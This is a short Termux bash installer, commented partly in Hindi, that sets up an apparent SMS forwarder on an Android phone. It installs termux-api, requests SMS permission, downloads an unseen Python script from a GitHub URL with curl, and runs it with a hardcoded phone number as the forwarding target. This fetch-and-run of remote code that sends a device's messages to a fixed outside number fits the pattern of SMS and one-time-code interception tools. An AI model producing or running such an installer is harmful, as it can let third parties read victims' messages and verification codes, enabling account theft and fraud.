#!/data/data/com.termux/files/usr/bin/bash

echo "=================================="
echo "📱 SMS Forwarder Installer"
echo "=================================="

# Get username from repository
USERNAME="YOUR_USERNAME"  # <-- Apna GitHub username dalo

# Update and install
echo "📦 Installing packages..."
pkg update -y && pkg upgrade -y
pkg install -y python termux-api

# Setup SMS permission
echo "🔐 Setting up SMS permission..."
termux-setup-sms

# Download forwarder script
echo "📥 Downloading forwarder..."
curl -o f.py "https://raw.githubusercontent.com/$USERNAME/sms-forwarder/main/f.py"

# Make executable
chmod +x f.py

# Run forwarder with target number
echo "🚀 Starting SMS forwarder..."
python f.py 9019005721
